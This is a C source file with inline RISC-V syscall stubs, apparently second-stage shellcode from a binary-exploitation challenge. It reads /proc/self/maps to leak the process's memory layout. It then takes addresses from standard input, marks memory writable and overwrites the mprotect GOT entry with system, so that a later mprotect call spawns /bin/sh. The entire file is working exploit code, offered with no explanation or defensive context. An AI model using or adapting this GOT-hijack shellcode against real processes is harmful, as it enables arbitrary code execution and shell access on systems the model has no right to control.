//riscv64-unknown-elf-gcc -e main -nostdlib shellcode2.c -o sc2 && riscv64-unknown-elf-objcopy --dump-section .text=sc2.bin sc2

int openat(int dirfd, char* pathname, int flags);
int read(int fd, void *buf,int size);
int write(int fd, void *buf, int size);
int mprotect(void* addr, unsigned long len, int prot);
void exit(int no);

int main() {

	char filename[32];
	filename[0] = '/';
	filename[1] = '.';
	filename[2] = '/';
	filename[3] = 'p';
	filename[4] = 'r';
	filename[5] = 'o';
	filename[6] = 'c';
	filename[7] = '/';
	filename[8] = 's';
	filename[9] = 'e';
	filename[10] = 'l';
	filename[11] = 'f';
	filename[12] = '/';
	filename[13] = 'm';
	filename[14] = 'a';
	filename[15] = 'p';
	filename[16] = 's';
	filename[17] = '\0';

	unsigned char *buf = (unsigned char*)0x6d000;
	int fd = openat(0, filename, 0);
	read(fd, buf, 0xF80);
	write(1, buf, 0xF80);
	read(fd, buf, 0xF80);
	write(1, buf, 0xF80);
	read(fd, buf, 0xF80);
	write(1, buf, 0xF80);

	unsigned long rodata;
	unsigned long mprotect_got;
	unsigned long system_addr;

	read(0, &rodata, 8);
	read(0, &mprotect_got, 8);
	read(0, &system_addr, 8);
	mprotect((void *)rodata, 0x3c000, 7);

	*(unsigned long *)mprotect_got = system_addr;

	buf[0] = '/';
	buf[1] = 'b';
	buf[2] = 'i';
	buf[3] = 'n';
	buf[4] = '/';
	buf[5] = 's';
	buf[6] = 'h';
	buf[7] = '\0';

	mprotect(buf, 0x1000, 7);	// this will call system("/bin/sh")
	exit(0);
}


asm("openat:\n"
		"li a7, 56\n"
		"ecall\n"
		"ret\n");



asm("read:\n"
		"li a7, 63\n"
		"ecall\n"
		"ret\n");


asm("write:\n"
		"li a7, 64\n"
		"ecall\n"
		"ret\n");


asm("mprotect:\n"
		"li a7, 226\n"
		"ecall\n"
		"ret\n");


asm("exit:\n"
		"li a7, 93\n"
		"ecall\n"
		"ret\n");